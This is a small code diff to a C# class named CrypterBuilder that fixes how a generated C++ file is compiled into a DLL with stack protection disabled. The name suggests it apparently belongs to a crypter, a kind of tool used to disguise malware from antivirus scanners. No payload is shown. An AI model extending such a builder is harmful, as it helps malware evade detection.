@@ -42,10 +42,13 @@ public static class CrypterBuilder
         {
             await File.WriteAllTextAsync(srcPath, cppSource);
             extraLibs ??= "kernel32.lib";
+            var objPath = Path.Combine(tempDir, "plugin.obj");
             var psi = new System.Diagnostics.ProcessStartInfo
             {
                 FileName               = clPath,
-                Arguments              = $"\"{srcPath}\" /LD /O2 /GS- /MT /W0 /nologo /Fe\"{dllPath}\" /Fo\"{tempDir}\\\" {extraLibs} /link /INCREMENTAL:NO /OPT:REF /OPT:ICF",
+                // Use explicit .obj path instead of /Fo"dir\" — trailing backslash before closing
+                // quote causes cmd to merge the lib arguments into the /Fo path (C1083 error).
+                Arguments              = $"\"{srcPath}\" /LD /O2 /GS- /MT /W0 /nologo /Fe\"{dllPath}\" /Fo\"{objPath}\" {extraLibs} /link /INCREMENTAL:NO /OPT:REF /OPT:ICF",
                 RedirectStandardOutput = true,
                 RedirectStandardError  = true,
                 UseShellExecute        = false,
